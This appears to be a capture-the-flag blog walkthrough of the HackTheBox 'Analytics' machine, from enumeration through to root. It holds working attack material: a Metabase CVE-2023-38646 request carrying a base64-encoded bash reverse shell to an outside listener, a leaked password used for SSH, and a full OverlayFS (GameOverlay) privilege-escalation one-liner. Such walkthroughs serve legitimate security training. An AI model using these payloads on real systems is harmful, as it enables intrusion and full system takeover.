---
layout: post
title: "HTB: Analytics"
author: Andrew Cherney
date: 2024-03-23 15:12:00
tags: htb easy-box linux webapp cve
icon: "assets/icons/analytics.png"
post_description: "To start this box a framework specific CVE can be used to find a leaked setup token and use javascript runtime to run bash commands. The environment variables leak an ssh login password for a free user. OverlayFS can exploited in the final step to get root."
---

# Summary

{{ page.post_description }}

# Enumeration

```bash
nmap -sC 10.129.149.57

Starting Nmap 7.92 ( https://nmap.org ) at 2023-10-10 17:50 CDT
Nmap scan report for 10.129.149.57
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://analytical.htb/
```

## Port 80 - http

{% include img_link src="/img/analytics/analytics_front_page" alt="front_page" ext="png" trunc=500 %}

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Analytics]
└──╼ $ffuf -w /opt/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://analytical.htb -H "Host: FUZZ.analytical.htb" -mc 200,401

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://analytical.htb
 :: Wordlist         : FUZZ: /opt/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.analytical.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,401
________________________________________________

data                    [Status: 200, Size: 77883, Words: 3574, Lines: 28, Duration: 388ms]
:: Progress: [114441/114441] :: Job [1/1] :: 259 req/sec :: Duration: [0:10:28] :: Errors: 40 ::
```

![metabase data.analytical.htb](/img/analytics/analytics_metabase.png)

# User as metabase

## CVE-2023-38646

In looking online I found a CVE relating to metabase which gives RCE. [https://github.com/securezeron/CVE-2023-38646/blob/main/README.md](https://github.com/securezeron/CVE-2023-38646/blob/main/README.md). In short the setup token is leaked and can be used to send a crafted database exploit to the endpoint `/api/setup/validate`. In this case it used javascript runtime to execute bash commands as the current user.

```bash
python3 CVE-2023-38646.py --rhost http://data.analytical.htb/ --lhost 10.10.14.2 --lport 7777

[DEBUG] Original rhost: http://data.analytical.htb/
[DEBUG] Preprocessed rhost: http://data.analytical.htb
[DEBUG] Input Arguments - rhost: http://data.analytical.htb, lhost: 10.10.14.2, lport: 7777
[DEBUG] Fetching setup token from http://data.analytical.htb/api/session/properties...
[DEBUG] Setup Token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
[DEBUG] Version: v0.46.6
[DEBUG] Setup token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
[DEBUG] Payload = YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjIvNzc3NyAwPiYx
[DEBUG] Sending request to http://data.analytical.htb/api/setup/validate with headers {'Content-Type': 'application/json'} and data {
    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details": {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules": {},
        "details": {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjIvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "test",
        "engine": "h2"
    }
}
[DEBUG] Response received: {"message":"Error creating or initializing trigger \"PWNSHELL\" object, class \"..source..\", cause: \"org.h2.message.DbException: Syntax error in SQL statement \"\"//javascript\\\\000ajava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjIvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}')\\\\000a\"\" [42000-212]\"; see root cause for details; SQL statement:\nSET TRACE_LEVEL_SYSTEM_OUT 1 [90043-212]"}
[DEBUG] POST to http://data.analytical.htb/api/setup/validate failed with status code: 400
```

I did get an error but I got a shell anyway. Odd but all too common in a lot of these types of exploits.

```bash
nc -nvlp 7777

Listening on 0.0.0.0 7777
Connection received on 10.10.11.233 37568
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
7588b98dcb8f:/$ whoami
whoami
metabase
```

# User as metalytics

## env variables

I spend a little time looking around and get the impression this is probably a container. And because of that the next places to check are mount points and environment variables. 

```bash
7588b98dcb8f:/bin$ env
env
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=7588b98dcb8f
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/bin
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=4
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
OLDPWD=/
```

That's a simple solution to this problem. SSH in and get user.txt

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Analytics]
└──╼ $ssh metalytics@analytical.htb 
The authenticity of host 'analytical.htb (10.10.11.233)' can't be established.
ECDSA key fingerprint is SHA256:/GPlBWttNcxd3ra0zTlmXrcsc1JM6jwKYH5Bo5qE5DM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'analytical.htb,10.10.11.233' (ECDSA) to the list of known hosts.
metalytics@analytical.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Oct 13 06:36:38 AM UTC 2023

  System load:              0.2568359375
  Usage of /:               93.4% of 7.78GB
  Memory usage:             28%
  Swap usage:               0%
  Processes:                201
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.10.11.233
  IPv6 address for eth0:    dead:beef::250:56ff:feb9:4043

  => / is using 93.4% of 7.78GB
  => There are 47 zombie processes.

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Oct  3 09:14:35 2023 from 10.10.14.41
metalytics@analytics:~$ cat user.txt
46a5eb714b----------------------
```


# Root

## CVE-2023-2640

In the classic enumeration post user I came across the ubuntu version, which although doesn't seem that old there were a couple search results for CVEs on this version.

```bash
metalytics@analytics:~$ cat /etc/os-release 
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
```

Labeled in [this reddit post about ubuntu privesc](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/), CVE-2023-2640 utilizes an improper implementation of OverlayFS to set privileged extended attributes without the necessary authentication check. 

OverlayFS itself is used to mount two directories, upper and lower, which function as one mounted directory. Any file name that exists within both the upper and lower directory will result in the upper file being pushed to the mounted directory. This is exceptionally useful for containers as the image can be loaded in the lower directory, and the upper can have specific file overwrites for config files or functionality purposes. 

In this exploit a lower directory file can be passed to OverlayFS and given elevated capabilities to setuid, which are leveraged to gain root. 

[https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-32629-CVE-2023-2640-GameOverlay-Ubuntu-Kernel-Exploit-LPE-0-day](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-32629-CVE-2023-2640-GameOverlay-Ubuntu-Kernel-Exploit-LPE-0-day)

```bash
metalytics@analytics:~$ export TD=$(mktemp -d) && cd $TD && unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);d=os.getenv("TD");os.system(f"rm -rf {d}");os.chdir("/root");os.system("/bin/sh")'

# id
uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
# cat /root/root.txt
32d4df9aa------------------------
```



